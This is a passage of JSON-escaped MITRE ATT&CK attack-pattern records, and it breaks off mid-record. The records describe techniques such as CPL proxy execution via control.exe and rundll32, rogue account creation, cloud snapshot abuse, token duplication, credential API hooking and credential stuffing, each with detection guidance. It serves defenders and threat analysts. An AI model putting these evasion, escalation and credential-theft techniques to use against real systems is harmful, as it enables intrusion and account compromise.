    "{\"created\":\"2020-01-23T19:59:52.630Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)\\n\\nFor ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing CPL)\\n\\nMalicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\",\"external_references\":[{\"external_id\":\"T1218.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1218/002\"},{\"description\":\"M. (n.d.). Implementing Control Panel Items. Retrieved January 18, 2018.\",\"source_name\":\"Microsoft Implementing CPL\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx\"},{\"description\":\"Mercês, F. (2014, January 27). CPL Malware - Malicious Control Panel Items. Retrieved January 18, 2018.\",\"source_name\":\"TrendMicro CPL Malware Jan 2014\",\"url\":\"https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf\"},{\"description\":\"Bernardino, J. (2013, December 17). Control Panel Files Used As Malicious Attachments. Retrieved January 18, 2018.\",\"source_name\":\"TrendMicro CPL Malware Dec 2013\",\"url\":\"https://blog.trendmicro.com/trendlabs-security-intelligence/control-panel-files-used-as-malicious-attachments/\"},{\"description\":\"Grunzweig, J. and Miller-Osborn, J. (2017, November 10). New Malware with Ties to SunOrcal Discovered. Retrieved November 16, 2017.\",\"source_name\":\"Palo Alto Reaver Nov 2017\",\"url\":\"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"}],\"id\":\"attack-pattern--4ff5d6a8-c062-4c68-a778-36fc5edd564f\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:33:18.929Z\",\"name\":\"Control Panel\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\",\"Windows Registry\",\"DLL monitoring\",\"Binary file metadata\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Application control\"],\"x_mitre_detection\":\"Monitor and analyze activity related to items associated with CPL files, such as the control.exe and the <code>Control_RunDLL</code> and <code>ControlRunDLLAsUser</code> API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: <code>control.exe file.cpl</code>) before [Rundll32](https://attack.mitre.org/techniques/T1218/011) is used to call the CPL\'s API functions (ex: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl</code>). CPL files can be executed directly via the CPL API function with just the latter [Rundll32](https://attack.mitre.org/techniques/T1218/011) command, which may bypass detections and/or execution filters for control.exe. (Citation: TrendMicro CPL Malware Jan 2014)\\n\\nInventory Control Panel items to locate unregistered and potentially malicious files present on systems:\\n\\n* Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\ControlPanel\\\\NameSpace</code> and <code>HKEY_CLASSES_ROOT\\\\CLSID\\\\{GUID}</code>. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. (Citation: Microsoft Implementing CPL)\\n* CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the <code>Cpls</code> and <code>Extended Properties</code> Registry keys of <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Control Panel</code>. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (<code> WinExec(\\\"c:\\\\windows\\\\system32\\\\control.exe {Canonical_Name}\\\", SW_NORMAL);</code>) or from a command line (<code>control.exe /name {Canonical_Name}</code>). (Citation: Microsoft Implementing CPL)\\n* Some Control Panel items are extensible via Shell extensions registered in <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Controls Folder\\\\{name}\\\\Shellex\\\\PropertySheetHandlers</code> where {name} is the predefined name of the system item. (Citation: Microsoft Implementing CPL)\\n\\nAnalyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques. (Citation: TrendMicro CPL Malware Jan 2014)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"external_references\":[{\"external_id\":\"T1196\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1196\"},{\"description\":\"M. (n.d.). Implementing Control Panel Items. Retrieved January 18, 2018.\",\"source_name\":\"Microsoft Implementing CPL\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx\"},{\"description\":\"Mercês, F. (2014, January 27). CPL Malware - Malicious Control Panel Items. Retrieved January 18, 2018.\",\"source_name\":\"TrendMicro CPL Malware Jan 2014\",\"url\":\"https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf\"},{\"description\":\"Bernardino, J. (2013, December 17). Control Panel Files Used As Malicious Attachments. Retrieved January 18, 2018.\",\"source_name\":\"TrendMicro CPL Malware Dec 2013\",\"url\":\"https://blog.trendmicro.com/trendlabs-security-intelligence/control-panel-files-used-as-malicious-attachments/\"},{\"description\":\"Grunzweig, J. and Miller-Osborn, J. (2017, November 10). New Malware with Ties to SunOrcal Discovered. Retrieved November 16, 2017.\",\"source_name\":\"Palo Alto Reaver Nov 2017\",\"url\":\"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"}],\"id\":\"attack-pattern--8df54627-376c-487c-a09c-7d2b5620f56e\",\"modified\":\"2020-01-31T18:59:21.682Z\",\"name\":\"Control Panel Items\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\\n\\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.\",\"external_references\":[{\"external_id\":\"T1136\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1136\"},{\"description\":\"Lich, B., Miroshnikov, A. (2017, April 5). 4720(S): A user account was created. Retrieved June 30, 2017.\",\"source_name\":\"Microsoft User Creation Event\",\"url\":\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720\"}],\"id\":\"attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-24T12:44:28.199Z\",\"name\":\"Create Account\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Microsoft Threat Intelligence Center (MSTIC)\",\"Praetorian\"],\"x_mitre_data_sources\":[\"Office 365 account logs\",\"Azure activity logs\",\"AWS CloudTrail logs\",\"Process monitoring\",\"Process command-line parameters\",\"Authentication logs\",\"Windows event logs\"],\"x_mitre_detection\":\"Monitor for processes and command-line parameters associated with account creation, such as <code>net user</code> or <code>useradd</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.\\n\\nCollect usage logs from cloud administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure AD\",\"Azure\",\"Office 365\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2020-05-14T14:45:15.978Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)\\n\\nCreating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.\",\"external_references\":[{\"external_id\":\"T1578.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1578/002\"},{\"description\":\"FireEye / Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.\",\"source_name\":\"Mandiant M-Trends 2020\",\"url\":\"https://content.fireeye.com/m-trends/rpt-m-trends-2020\"},{\"description\":\"Amazon. (n.d.). Search CloudTrail logs for API calls to EC2 Instances. Retrieved June 17, 2020.\",\"source_name\":\"AWS CloudTrail Search\",\"url\":\"https://aws.amazon.com/premiumsupport/knowledge-center/cloudtrail-search-api-calls/\"},{\"description\":\"Microsoft. (n.d.). View Azure activity logs. Retrieved June 17, 2020.\",\"source_name\":\"Azure Activity Logs\",\"url\":\"https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/view-activity-logs\"},{\"description\":\"Google. (n.d.). Audit Logs. Retrieved June 1, 2020.\",\"source_name\":\"Cloud Audit Logs\",\"url\":\"https://cloud.google.com/logging/docs/audit#admin-activity\"}],\"id\":\"attack-pattern--cf1c2504-433f-4c4e-a1f8-91de45a0318c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-18T11:45:36.417Z\",\"name\":\"Create Cloud Instance\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"GCP audit logs\",\"Stackdriver logs\",\"Azure activity logs\",\"AWS CloudTrail logs\"],\"x_mitre_detection\":\"The creation of a new instance or VM is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, the creation of an instance by a new user account or the unexpected creation of one or more snapshots followed by the creation of an instance may indicate suspicious activity.\\n\\nIn AWS, CloudTrail logs capture the creation of an instance in the <code>RunInstances</code> event, and in Azure the creation of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google\'s Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances create</code> to create a VM.(Citation: Cloud Audit Logs)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-18T16:48:56.582Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with <code>DuplicateToken(Ex)</code> and use it with <code>CreateProcessWithTokenW</code> to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.\",\"external_references\":[{\"external_id\":\"T1134.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1134/002\"},{\"description\":\"Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.\",\"source_name\":\"Microsoft Command-line Logging\",\"url\":\"https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing\"}],\"id\":\"attack-pattern--677569f9-a8b0-459e-ab24-7f18091fa7bf\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-26T21:28:19.476Z\",\"name\":\"Create Process with Token\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"Access tokens\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Windows User Account Control\",\"System access controls\",\"File system access controls\"],\"x_mitre_detection\":\"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\\n\\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.\\n\\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code> and <code>CreateProcessWithTokenW</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-06-09T15:33:13.563Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1536) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.\\n\\nAn adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)\",\"external_references\":[{\"external_id\":\"T1578.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1578/001\"},{\"description\":\"FireEye / Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.\",\"source_name\":\"Mandiant M-Trends 2020\",\"url\":\"https://content.fireeye.com/m-trends/rpt-m-trends-2020\"},{\"description\":\"Amazon. (2020). Logging AWS Backup API Calls with AWS CloudTrail. Retrieved April 27, 2020.\",\"source_name\":\"AWS Cloud Trail Backup API\",\"url\":\"https://docs.aws.amazon.com/aws-backup/latest/devguide/logging-using-cloudtrail.html\"},{\"description\":\"Microsoft. (2019, June 4). Monitor at scale by using Azure Monitor. Retrieved May 1, 2020.\",\"source_name\":\"Azure - Monitor Logs\",\"url\":\"https://docs.microsoft.com/en-us/azure/backup/backup-azure-monitoring-use-azuremonitor\"},{\"description\":\"Google. (n.d.). Audit Logs. Retrieved June 1, 2020.\",\"source_name\":\"Cloud Audit Logs\",\"url\":\"https://cloud.google.com/logging/docs/audit#admin-activity\"},{\"description\":\"Google. (2020, April 23). Creating and Starting a VM instance. Retrieved May 1, 2020.\",\"source_name\":\"GCP - Creating and Starting a VM\",\"url\":\"https://cloud.google.com/compute/docs/instances/create-start-instance#api_2\"}],\"id\":\"attack-pattern--ed2e45f9-d338-4eb2-8ce5-3a2e03323bc1\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-19T14:45:59.618Z\",\"name\":\"Create Snapshot\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"GCP audit logs\",\"Stackdriver logs\",\"Azure activity logs\",\"AWS CloudTrail logs\"],\"x_mitre_detection\":\"The creation of a snapshot is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities such as the creation of one or more snapshots and the restoration of these snapshots by a new user account.\\n\\nIn AWS, CloudTrail logs capture the creation of snapshots and all API calls for AWS Backup as events. Using the information collected by CloudTrail, you can determine the request that was made, the IP address from which the request was made, which user made the request, when it was made, and additional details.(Citation: AWS Cloud Trail Backup API).\\n\\nIn Azure, the creation of a snapshot may be captured in Azure activity logs. Backup restoration events can also be detected through Azure Monitor Log Data by creating a custom alert for completed restore jobs.(Citation: Azure - Monitor Logs)\\n\\nGoogle\'s Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of the <code>gcloud compute instances create</code> command to create a new VM disk from a snapshot.(Citation: Cloud Audit Logs) It is also possible to detect the usage of the GCP API with the <code>\\\"sourceSnapshot\\\":</code> parameter pointed to <code>\\\"global/snapshots/[BOOT_SNAPSHOT_NAME]</code>.(Citation: GCP - Creating and Starting a VM)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-10T16:03:18.865Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. (Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \\n\\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \\n\\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. (Citation: OSX Malware Detection).  \",\"external_references\":[{\"external_id\":\"T1543\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1543\"},{\"description\":\"Microsoft. (n.d.). Services. Retrieved June 7, 2016.\",\"source_name\":\"TechNet Services\",\"url\":\"https://technet.microsoft.com/en-us/library/cc772408.aspx\"},{\"description\":\"Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.\",\"source_name\":\"AppleDocs Launch Agent Daemons\",\"url\":\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\"},{\"description\":\"Patrick Wardle. (2016, February 29). Let\'s Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017.\",\"source_name\":\"OSX Malware Detection\",\"url\":\"https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf\"}],\"id\":\"attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-25T22:32:16.537Z\",\"name\":\"Create or Modify System Process\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows event logs\",\"Windows Registry\",\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline. New, benign system processes may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.  \\n\\nCommand-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. \\n\\nMonitor for changes to files associated with system-level processes.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Windows\",\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T19:01:15.930Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\\n\\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Endgame Process Injection July 2017)\\n* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Endgame Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Endgame Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\\n\",\"external_references\":[{\"external_id\":\"T1056.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1056/004\"},{\"description\":\"Microsoft. (2017, September 15). TrojanSpy:Win32/Ursnif.gen!I. Retrieved December 18, 2017.\",\"source_name\":\"Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017\",\"url\":\"https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=TrojanSpy:Win32/Ursnif.gen!I&threatId=-2147336918\"},{\"description\":\"Microsoft. (n.d.). Hooks Overview. Retrieved December 12, 2017.\",\"source_name\":\"Microsoft Hook Overview\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"Tigzy. (2014, October 15). Userland Rootkits: Part 1, IAT hooks. Retrieved December 12, 2017.\",\"source_name\":\"Adlice Software IAT Hooks Oct 2014\",\"url\":\"https://www.adlice.com/userland-rootkits-part-1-iat-hooks/\"},{\"description\":\"Hillman, M. (2015, August 8). Dynamic Hooking Techniques: User Mode. Retrieved December 20, 2017.\",\"source_name\":\"MWRInfoSecurity Dynamic Hooking 2015\",\"url\":\"https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/\"},{\"description\":\"Mariani, B. (2011, September 6). Inline Hooking in Windows. Retrieved December 12, 2017.\",\"source_name\":\"HighTech Bridge Inline Hooking Sept 2011\",\"url\":\"https://www.exploit-db.com/docs/17802.pdf\"},{\"description\":\"Volatility Labs. (2012, September 24). MoVP 3.1 Detecting Malware Hooks in the Windows GUI Subsystem. Retrieved December 12, 2017.\",\"source_name\":\"Volatility Detecting Hooks Sept 2012\",\"url\":\"https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html\"},{\"description\":\"Prekas, G. (2011, July 11). Winhook. Retrieved December 12, 2017.\",\"source_name\":\"PreKageo Winhook Jul 2011\",\"url\":\"https://github.com/prekageo/winhook\"},{\"description\":\"Satiro, J. (2011, September 14). GetHooks. Retrieved December 12, 2017.\",\"source_name\":\"Jay GetHooks Sept 2011\",\"url\":\"https://github.com/jay/gethooks\"},{\"description\":\"Felici, M. (2006, December 6). Any application-defined hook procedure on my machine?. Retrieved December 12, 2017.\",\"source_name\":\"Zairon Hooking Dec 2006\",\"url\":\"https://zairon.wordpress.com/2006/12/06/any-application-defined-hook-procedure-on-my-machine/\"},{\"description\":\"Eye of Ra. (2017, June 27). Windows Keylogger Part 2: Defense against user-land. Retrieved December 12, 2017.\",\"source_name\":\"EyeofRa Detecting Hooking June 2017\",\"url\":\"https://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/\"},{\"description\":\"GMER. (n.d.). GMER. Retrieved December 12, 2017.\",\"source_name\":\"GMER Rootkits\",\"url\":\"http://www.gmer.net/\"},{\"description\":\"Microsoft. (n.d.). Taking a Snapshot and Viewing Processes. Retrieved December 12, 2017.\",\"source_name\":\"Microsoft Process Snapshot\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms686701.aspx\"},{\"description\":\"Stack Exchange - Security. (2012, July 31). What are the methods to find hooked functions and APIs?. Retrieved December 12, 2017.\",\"source_name\":\"StackExchange Hooks Jul 2012\",\"url\":\"https://security.stackexchange.com/questions/17904/what-are-the-methods-to-find-hooked-functions-and-apis\"}],\"id\":\"attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-24T21:29:13.565Z\",\"name\":\"Credential API Hooking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows event logs\",\"Process monitoring\",\"Loaded DLLs\",\"DLL monitoring\",\"Binary file metadata\",\"API monitoring\"],\"x_mitre_detection\":\"Monitor for calls to the `SetWindowsHookEx` and `SetWinEventHook` functions, which install a hook procedure.(Citation: Microsoft Hook Overview)(Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools(Citation: Volatility Detecting Hooks Sept 2012)(Citation: PreKageo Winhook Jul 2011)(Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures.(Citation: Zairon Hooking Dec 2006)(Citation: EyeofRa Detecting Hooking June 2017)\\n\\nRootkits detectors(Citation: GMER Rootkits) can also be used to monitor for various types of hooking activity.\\n\\nVerify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes(Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions.(Citation: StackExchange Hooks Jul 2012)(Citation: Adlice Software IAT Hooks Oct 2014)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:39:59.959Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\\n\\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization\'s login failure policies.\\n\\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\\n\\n* SSH (22/TCP)\\n* Telnet (23/TCP)\\n* FTP (21/TCP)\\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\\n* LDAP (389/TCP)\\n* Kerberos (88/TCP)\\n* RDP / Terminal Services (3389/TCP)\\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\\n* MSSQL (1433/TCP)\\n* Oracle (1521/TCP)\\n* MySQL (3306/TCP)\\n* VNC (5900/TCP)\\n\\nIn addition to management services, adversaries may \\\"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\\\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\",\"external_references\":[{\"external_id\":\"T1110.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1110/004\"},{\"description\":\"US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.\",\"source_name\":\"US-CERT TA18-068A 